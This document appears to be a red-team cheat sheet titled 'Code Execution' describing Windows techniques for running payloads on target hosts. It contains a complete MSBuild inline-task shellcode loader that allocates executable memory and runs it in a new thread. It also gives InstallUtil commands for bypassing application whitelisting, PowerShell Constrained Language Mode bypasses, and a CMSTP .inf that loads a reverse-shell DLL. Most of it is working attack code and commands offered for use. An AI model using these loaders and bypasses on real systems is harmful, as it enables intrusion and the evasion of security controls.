---
title: Code Execution
date: 2026-01-22
background: bg-[#F97316]
icon: code.svg
tags:
  - exploitation
  - code execution
  - red teaming
  - penetration testing
  - malware
categories:
  - Tactics, Techniques, and Procedures
intro:
  Common techniques and tooling for achieving command execution in unorthodox manners on target systems.
plugins:
  - copyCode
---

## Windows Focused

### MSBuild {.row-span-3 .col-span-2} 

Msbuild.exe is a native windows binary for compiling and executing inline C# code

To make use, create shellcode using your preferred method. 

Then insert shellcode into Line 46 of this code

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
		    byte[] shellcode = new byte[] { <PLACE SHELLCODE HERE> };
		      
		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>
  ```

  Execute the xml file on the target host
  ```powershell
  #note the framework version may be different on your target
  C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
  ```
  See:[ired-team](https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c)


### InstallUtil
InstallUtil's is to be used when attempting bypass application whitelisting

First you must generate specially crafted a C# payload  that contains your shellcode and upload the .cs file to the target host
Recommendations for generating the file are to use this Git Repo: [WhiteListEvasion](https://github.com/khr0x40sh/WhiteListEvasion)

Once the file is on the target host compile into a `.exe` file
```powershell {.wrap}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\experiments\installUtil\temp.cs
```

Execute using InstallUtil
```powershell {.wrap}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Microsoft.NET\Framework\v4.0.30319\temp.exe
```

### PS Constrained Language 
Get what mode the is running
```powershell
$ExecutionContext.SessionState.LanguageMode
```

If running `ConstrainedLanguage`

try:

**Downgrade Method**
PowerShell version 2 does not have modern security features and is usually deployed by default across systems due to older version of .Net requiring it. 
```powershell
powershell -version 2
```

**System32 Bypass**
This method was discovered by Carrie Roberts which she wrote about [here](https://www.blackhillsinfosec.com/constrained-language-mode-bypass-when-pslockdownpolicy-is-used/)

The bypass works by making the path from where your script is being executed, contains the string system32, meaning even if you rename the script to system32.ps1, it should work.

```powershell
PS>cat .\system32.ps1
$ExecutionContext.SessionState.LanguageMode

PS>.\test.ps1; mv .\test.ps1 system32.ps1; .\system32.ps1
ConstrainedLanguage
FullLanguage
```

### CMSTP

The Microsoft Connection Manager Profiler installer is a Windows LoLBin for handling service profiles for VPNs / Remote access tools
For this method to work your reverse shell must be a DLL

Then you should create an `.inf` file that can be loaded by the CSMTP binary

```inf
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
C:\experiments\cmstp\evil.dll
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="mantvydas"
ShortSvcName="mantvydas"
```

Once that is created you call the `.inf` file via CMSTP
```powershell
cmstp.exe /s .\f.inf
```

This will spawn a Rundll32 executable to handle the DLL. 


See: [Pentest Lab](https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/)
See: [Ired-Team](https://www.ired.team/offensive-security/code-execution/t1191-cmstp-code-execution)